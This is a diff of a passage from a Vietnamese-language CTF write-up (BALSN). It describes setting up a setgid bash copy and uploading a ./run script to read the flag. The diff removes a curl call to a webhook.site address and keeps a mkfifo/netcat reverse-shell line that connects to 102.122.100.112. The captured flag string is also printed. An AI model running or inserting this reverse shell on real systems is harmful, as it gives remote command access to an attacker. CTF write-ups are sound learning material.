@@ -49,14 +49,11 @@
 - File này sẽ copy bash vào thư mục data và thiết lập setgid và thực thi shell với egid=1000 
 - Sau đó up script dưới dạng file ./run để nhận flag là xong
 ```#!/usr/bin/bash
-
-curl -d "ver2" https://webhook.site/6dd0417b-027e-4eb2-8f2c-b0a87bcc4c16
-
 rm /tmp/f
 mkfifo /tmp/f
-cat /tmp/f|sh -i 2>&1|nc 102.122.100.112 1000 >/tmp/f`
+cat /tmp/f|sh -i 2>&1|nc 102.122.100.112 1000 >/tmp/f```
 
-```
+`
 $cat ../../flag2
 BALSN{d0cK3r_baD_8ad_ro07_B4d_b@d}
 `
